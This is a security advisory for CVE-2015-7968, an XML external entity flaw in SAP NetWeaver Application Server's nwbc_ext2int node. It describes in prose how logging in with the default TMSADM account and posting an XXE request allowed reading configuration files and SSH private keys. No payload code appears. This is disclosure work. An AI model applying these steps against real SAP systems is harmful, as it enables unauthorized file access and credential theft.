# CVE-2015-7968 - SAP Netweaver Application Server XXE (SAP Security Note 2183189)

## 1. Vulnerability Properties

**Title: XML External Entities (XXE) / Local File Inclusion**

**CVE ID:**Â CVE-2015-7968

**CVSSv3 Base Score:Â**4.9 AV:N/AC:M/AU:S/C:P/I:N/A:P

**Vendor:** SAP

**Products:** SAP NetWeaver Application Server

**Advisory Release Date:** 12 January 2016

**Advisory URL:**Â https://labs.integrity.pt/advisories/cve-2015-7968

**Credits:Â**Discovery by Tiago Sintra <ts[at]integrity.pt>

## 2. Vulnerability Summary

SAP NetWeaver Application Server uses a module called **nwbc\_ext2int** which is vulnerable to XXE attacks. According to the documentation, this node is used when data is to be displayed in a side panel. The node converts the external representation of UI elements to an internal representation.

## 3. Technical Details

The vulnerability can only be exploited after authentication. For this case study, it was possible to login using the default TMSADM account which seems to be available on various installations by default. Even though access to most areas was not allowed in this account it was possible to enumerate some modules running.

After authentication, we checked which of the default nodes were enabled and found that the nwbc\_ext2int responded with XML content. By posting the same XML as the page returned initially, it was possible to get the page to reflect the value on the FIELD\_VALUE tag. Since we had a page that accepted XML and reflected our content, the chances of a successful XXE exploitation were good. And in fact, creating a POST request with a simple XXE header proven to be enough to exploit the vulnerability.

Since SAP is a Java based application, the XML parser used allowed us to read not only files but also directories. File access is restricted by the user context used to run SAP. In our case, we got a low privileged user but we could still successfully fetch many SAP configuration files and also the SSH private keys of our user from the /home directory. This could allow an attacker to be able to connect directly to the target server through SSH and consequently gain access to many other exploitable vectors.
